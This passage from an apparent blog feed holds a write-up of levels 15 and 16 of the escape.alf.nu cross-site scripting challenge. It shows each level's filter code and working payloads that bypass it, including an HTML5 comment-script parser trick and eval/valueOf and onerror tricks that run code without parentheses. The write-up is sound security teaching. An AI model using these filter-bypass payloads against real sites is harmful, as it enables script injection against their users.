<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(s)</span> </span>{</div><div class="line">	<span class="keyword">return</span> s.split(<span class="string">'#'</span>).map(<span class="function"><span class="keyword">function</span><span class="params">(v)</span> </span>{</div><div class="line">		<span class="comment">// Only 20% of slashes are end tags; save 1.2% of total</span></div><div class="line">		<span class="comment">// bytes by only escaping those.</span></div><div class="line">		<span class="keyword">var</span> json = <span class="built_in">JSON</span>.stringify(v).replace(<span class="regexp">/&lt;\//g</span>, <span class="string">'&lt;\\/'</span>);</div><div class="line">		<span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log('</span>+json+<span class="string">')&lt;/script&gt;'</span>;</div><div class="line">	}).join(<span class="string">''</span>);</div><div class="line">}</div></pre></td></tr></table></figure>

<p>We can use the same trick we used for level 14. We can start with something simple like:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">payload1<span class="comment">#payload2</span></div></pre></td></tr></table></figure>

<p>that will render:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">   	<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"><span class="built_in">console</span>.log(<span class="string">"payload1"</span>)</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"><span class="built_in">console</span>.log(<span class="string">"payload2"</span>)</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div></pre></td></tr></table></figure>

<p>We can take advantage of HTML5 “”!—“script”” trick to change the way the parser treats the code between the two blocks and inject our “alert(1)” payload. Note that this trick only works in HTML5 documents and we will need to inject a closing “—&gt;” since it is not present in the code</p>
<p>The solution is:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!--&lt;script&gt;#)/;alert(1)//--&gt;</span></div></pre></td></tr></table></figure>

<p>This will render:</p>
<p>Since we transition to “ script data double escaped state ” when the parser finds “&lt;!—“script’”, the JS engine will receive the following valid JS expression:</p>
<p>That can be interpreted as:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">console</span>.log(<span class="string">"junk_string"</span>) &lt; <span class="regexp">/junk_regexp/</span> ; alert(<span class="number">1</span>) <span class="comment">// --&gt;</span></div></pre></td></tr></table></figure>

<p>Where:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">junk_string</span>: <span class="string">&lt;!—&lt;script&gt;</span></div><div class="line"><span class="attribute">junk_regexp</span>: <span class="string">script&gt;&lt;script&gt;console.log(“)</span></div></pre></td></tr></table></figure>

<p>Actually you can see in the console that the first console.log writes ‘&lt;!—“script”’</p>
<p>In order to make it even shorter we can replace “//” with unicode \u2028 as suggested by Mario</p>
<h3 id="Level_16:">Level 16:</h3>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(text)</span> </span>{</div><div class="line">	<span class="comment">// *cough* not done</span></div><div class="line">	<span class="keyword">var</span> i = <span class="number">0</span>;</div><div class="line">	<span class="built_in">window</span>.the_easy_but_expensive_way_out = <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>{ alert(i++) };</div><div class="line">	<span class="comment">// "A JSON text can be safely passed into JavaScript's eval() function</span></div><div class="line">	<span class="comment">// (which compiles and executes a string) if all the characters not</span></div><div class="line">	<span class="comment">// enclosed in strings are in the set of characters that form JSON</span></div><div class="line">	<span class="comment">// tokens."</span></div><div class="line">	<span class="keyword">if</span> (!(<span class="regexp">/[^,:{}\[\]0-9.\-+Eaeflnr-u \n\r\t]/</span>.test(</div><div class="line"> text.replace(<span class="regexp">/"(\\.|[^"\\])*"/g</span>, <span class="string">''</span>)))) {</div><div class="line">		<span class="keyword">try</span> {</div><div class="line">		<span class="keyword">var</span> val = <span class="built_in">eval</span>(<span class="string">'('</span> + text + <span class="string">')'</span>);</div><div class="line">		<span class="built_in">console</span>.log(<span class="string">''</span> + val);</div><div class="line">		} <span class="keyword">catch</span> (_) {</div><div class="line">		 <span class="built_in">console</span>.log(<span class="string">'Crashed: '</span>+_);</div><div class="line">			}	</div><div class="line">		} <span class="keyword">else</span> {</div><div class="line">	<span class="built_in">console</span>.log(<span class="string">'Rejected.'</span>);</div><div class="line">	}</div><div class="line">}</div></pre></td></tr></table></figure>

<p>This level is based on a real world filter described by Stefano Di Paola in this post</p>
<p>If we study the regexp carefully we will see that the letter “s” is allowed since its within the “u-r” interval, that allows us to use the word “self” and with that we can craft a valid JSON payload. The trick is that we will be adding “0” to our object so the JS engine will need to calculate the valueOf our object. So if we define the “valueOf” function as the “the_easy_but_expensive_way_out” global function, we will be able to invoke it during the arithmetic operation. The problem is that it will alert “0” since “i” its initialized with “0”, but we can do it twice to alert a “1”.</p>
<p>Long Solution:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">{	</div><div class="line">	<span class="string">"valueOf"</span><span class="symbol">:self</span>[<span class="string">"the_easy_but_expensive_way_out"</span>]</div><div class="line">}+<span class="number">0</span>,</div><div class="line">	<span class="string">"valueOf"</span><span class="symbol">:self</span>[<span class="string">"the_easy_but_expensive_way_out"</span>]</div><div class="line">}</div></pre></td></tr></table></figure>

<p>That is a nice trick to execute a function when parenthesis are not allowed. But there some more like Gareth famous one:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">onerror=<span class="built_in">eval</span>;<span class="keyword">throw</span>[<span class="string">'=1;alert\x281\x29'</span>]</div></pre></td></tr></table></figure>

<p>You can get a shorter solution for IE only as explained by Stefano Di Paola in his post</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">{</div><div class="line">	<span class="string">"valueOf"</span><span class="symbol">:self</span>[<span class="string">"location"</span>],<span class="string">"toString"</span><span class="symbol">:[]</span>[<span class="string">"join"</span>],</div><div class="line">	<span class="number">0</span><span class="symbol">:<span class="string">"javascript:alert(1)"</span></span>,<span class="string">"length"</span><span class="symbol">:</span><span class="number">1</span></div><div class="line">}</div></pre></td></tr></table></figure>

<p>And thats all folks, thanks for reading!</p>
<h2 id="Part1"><a href="http://evilddog.github.io/2014/10/12/escape-alf-nu-write-ups-2/" target="_blank" rel="external">Part1</a></h2>
]]></content>
    <summary type="html">
    <![CDATA[<hr>

<h2 id="前言">前言</h2>
<p>这是接<a href="http://evilddog.github.io/2014/10/12/escape-alf-nu-write-ups-2/" target="_blank" rel="external">上一篇</a>的Write-up</p>
]]>
    
    </summary>
    
      <category term="XSS" scheme="http://evilddog.github.io//tags/XSS/"/>
    
      <category term="前端安全" scheme="http://evilddog.github.io//categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
</feed>
